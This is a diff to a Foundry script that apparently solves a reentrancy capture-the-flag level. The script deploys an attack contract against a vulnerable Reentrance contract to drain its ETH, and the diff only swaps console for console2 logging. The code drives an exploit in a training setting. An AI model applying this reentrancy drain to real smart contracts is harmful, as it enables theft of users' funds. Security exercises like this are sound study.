@@ -1,8 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "forge-std/Script.sol";
-import "forge-std/console.sol";
+import {Script, console2} from "forge-std/Script.sol";
 import {Reentrance} from "../src/Reentrance.sol";
 
 contract ReentranceSolution is Script {
@@ -19,9 +18,9 @@ contract ReentranceSolution is Script {
         address donator = makeAddr("donator");
         vm.startPrank(donator);
         vm.deal(donator, 0.05 ether);
-        console.log("Donator Balance:", reentranceInstance.balanceOf(donator));
+        console2.log("Donator Balance:", reentranceInstance.balanceOf(donator));
         reentranceInstance.donate{value: 0.05 ether}(donator);
-        console.log("Donator Balance:", reentranceInstance.balanceOf(donator));
+        console2.log("Donator Balance:", reentranceInstance.balanceOf(donator));
         vm.stopPrank();
 
         // The attack will start from here and the attacker will be able to drain all the ETH in `Reentrance` contract.
@@ -39,12 +38,12 @@ contract ReentranceSolution is Script {
         attackContract = new ReentranceAttack(address(reentranceInstance));
 
         // Start the attack
-        console.log("------- ATTACK WILL HAPPEN ----------");
-        console.log("Reentrance Balance:", address(reentranceInstance).balance);
-        console.log("Attacker Balance:", address(attackContract).balance);
+        console2.log("------- ATTACK WILL HAPPEN ----------");
+        console2.log("Reentrance Balance:", address(reentranceInstance).balance);
+        console2.log("Attacker Balance:", address(attackContract).balance);
         attackContract.attack{value: 0.01 ether}();
-        console.log("Reentrance Balance:", address(reentranceInstance).balance);
-        console.log("Attacker Balance:", address(attackContract).balance);
+        console2.log("Reentrance Balance:", address(reentranceInstance).balance);
+        console2.log("Attacker Balance:", address(attackContract).balance);
         vm.stopPrank();
 
         // You can preview the logs in the terminal, you will find the reentrancy like a pyramid fallback
